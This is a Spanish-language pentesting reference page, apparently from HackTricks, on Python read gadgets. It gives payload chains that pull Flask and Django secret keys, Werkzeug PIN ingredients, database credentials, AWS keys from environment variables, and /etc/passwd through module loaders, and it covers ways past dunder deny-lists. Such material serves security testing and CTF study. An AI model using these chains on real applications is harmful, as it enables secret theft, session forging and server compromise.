# Gadgets de lectura interna de Python

{{#include ../../banners/hacktricks-training.md}}

## Información básica

Diferentes vulnerabilidades, como [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) o [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), podrían permitirte **leer datos internos de Python, pero no ejecutar código**. Por lo tanto, un pentester deberá aprovechar al máximo estos permisos de lectura para **obtener privilegios sensibles y escalar la vulnerabilidad**.

### Flask - Leer la secret key

La página principal de una aplicación Flask probablemente tendrá el objeto global **`app`**, donde está configurada esta **secret**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
En este caso es posible acceder a este objeto usando cualquier gadget para **acceder a objetos globales** de la página [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

En el caso de que **la vulnerabilidad se encuentre en un archivo Python diferente**, necesitas un gadget para recorrer archivos hasta llegar al principal y **acceder al objeto global `app.secret_key`**, y así poder [**escalar privilegios** conociendo esta clave](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Un payload como este [de este writeup](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Usa este payload para **leer `app.secret_key`**. Si el bug original también te proporciona una primitiva de escritura (por ejemplo, class pollution), puedes usar el mismo método para reemplazarla y firmar cookies de Flask con más privilegios.

### Werkzeug - machine_id y node uuid

[**Usando estos payloads de este writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) podrás acceder al **machine_id** y al **uuid** del node, que son los **bits privados** que necesitas para [**generar el pin de Werkzeug**](../../network-services-pentesting/pentesting-web/werkzeug.md) y acceder a la consola de Python en `/console` si el **debug mode está habilitado**:
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Ten en cuenta que puedes obtener la **ruta local del servidor al `app.py`** generando algún **error** en la página web que te **dará la ruta**.

Si la vulnerabilidad se encuentra en un archivo de Python diferente, consulta el truco anterior de Flask para acceder a los objetos del archivo principal de Python.

### Django - SECRET_KEY y módulo de settings

El objeto de configuración de Django se almacena en caché en `sys.modules` una vez que la aplicación se inicia. Con solo primitivas de lectura puedes hacer leak de la **`SECRET_KEY`**, las claves de respaldo, las credenciales de la base de datos o las sales de firma:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Si el gadget vulnerable está en otro módulo, recorre primero `globals`:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` son igual de valiosas que la `SECRET_KEY` actual: siguen validando valores firmados antiguos durante la rotación. También haz leak de `SESSION_ENGINE` y `SESSION_SERIALIZER` para determinar rápidamente si el impacto se limita a la falsificación de cookies o si es algo más grave. Para consultar los detalles del impacto web, revisa la [**página de pentesting de Django**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - leer código fuente y archivos

Los módulos de Python cargados normalmente conservan un `__loader__`. Los loaders respaldados por archivos suelen exponer `get_source()` y `get_data()`, que son **primitivas de solo lectura** perfectas cuando ya puedes acceder a un objeto de módulo, pero no a `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Esto resulta muy útil para volcar **módulos de configuración, blueprints, archivos auxiliares o rutas ocultas** y recuperar API keys, DSN, rutas de flags o puntos de entrada adicionales de gadgets.

Si solo tienes enumeración de subclases, busca el loader por nombre en lugar de codificar un índice:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globales del frame de generator / coroutine

Si puedes crear o alcanzar un objeto generator/coroutine, su frame puede filtrar globales **sin necesitar ningún gadget `__globals__` de una función**. Esto resulta útil contra filtros que solo bloquean nombres dunder y olvidan atributos del frame como `gi_frame`, `ag_frame`, `cr_frame` o `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Una vez que tengas los globals del frame, continúa exactamente igual que con los otros gadgets (`sys.modules`, objetos de configuración, `os.environ`, etc.). Los sandbox escapes recientes siguen redescubriendo esto porque `gi_frame` y `f_globals` no son atributos dunder y a menudo sobreviven a las deny-lists ingenuas.

### Variables de entorno / credenciales cloud mediante módulos cargados

Muchos jails todavía importan `os` o `sys` en algún punto. Puedes abusar de cualquier función accesible `__init__.__globals__` para pivotar al módulo `os` ya importado y volcar las **variables de entorno** que contienen API tokens, cloud keys o flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Si el índice de la subclase está filtrado, usa loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Las variables de entorno son con frecuencia los únicos secretos necesarios para pasar de una lectura a un compromiso total (cloud IAM keys, database URLs, signing keys, etc.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0>`) permitía **class pollution** mediante crafted component requests. Establecer una property path como `__init__.__globals__` permitía a un atacante acceder a los component module globals y a cualquier imported modules (por ejemplo, `settings`, `os`, `sys`). Desde ahí puedes hacer leak de `SECRET_KEY`, `DATABASES` o de las credenciales de servicios sin ejecutar código. La exploit chain se basa únicamente en lecturas y utiliza los mismos patrones de dunder-gadgets mencionados anteriormente.

### Gadget collections for chaining

CTFs recientes y la investigación sobre pyjail muestran read chains fiables construidas únicamente con attribute access y subclass enumeration. Listas mantenidas por la comunidad, como [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), catalogan cientos de minimal gadgets que puedes combinar para recorrer desde objetos hasta `__globals__`, `sys.modules` y, finalmente, datos sensibles. Prefiere búsquedas basadas en atributos/nombres frente a raw subclass indexes, porque la posición de `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, etc. cambia entre versiones de Python y con bibliotecas importadas adicionales.

## Referencias

- [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
